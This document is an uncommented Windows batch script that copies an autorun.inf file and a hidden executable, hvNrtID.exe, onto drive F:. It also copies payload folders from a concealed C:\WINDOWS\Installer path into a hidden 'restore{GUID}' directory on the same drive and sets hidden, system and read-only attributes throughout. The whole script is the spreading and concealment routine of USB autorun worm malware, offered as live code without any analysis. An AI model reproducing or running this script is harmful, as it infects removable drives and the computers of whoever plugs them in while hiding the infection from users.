if not exist F:\ exit
del /q /f /a:r,h,s,a F:\autorun.inf
copy C:\WINDOWS\Installer\24ha12\c2d\autorun.inf, F:\autorun.inf
attrib +r +a +s +h F:\autorun.inf
if exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\vers\vers001 if exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\vers\vers002 if exist F:\hvNrtID.exe exit
if exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins rd /s /q F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins
if not exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins md F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins
attrib +h +s F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}
if not exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\c2d md F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\c2d
copy C:\WINDOWS\Installer\24ha12\c2d\*.*, F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\c2d
if not exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\Ic2d md F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\Ic2d
copy C:\WINDOWS\Installer\24ha12\Ic2d\*.*, F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\Ic2d
if not exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\d2c md F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\d2c
copy C:\WINDOWS\Installer\24ha12\d2c\*.*, F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\d2c
if not exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\Id2c md F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\Id2c
copy C:\WINDOWS\Installer\24ha12\Id2c\*.*, F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\Id2c
if not exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\UD md F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\UD
copy C:\WINDOWS\Installer\24ha12\UD\*.*, F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\UD
if not exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\inet md F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\inet
copy C:\WINDOWS\Installer\24ha12\inet\*.*, F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\inet
if not exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\inet\intupdate md F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\inet\intupdate
if not exist F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\pers md F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\hvNrt_ins\24ha12\pers
del /q /f /a:r,h,s,a F:\hvNrtID.exe
copy C:\WINDOWS\Installer\24ha12\c2d\hvNrtID.exe, F:\hvNrtID.exe
attrib +r +a +s +h F:\hvNrtID.exe
md F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\vers\vers001
md F:\restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}\vers\vers002
exit


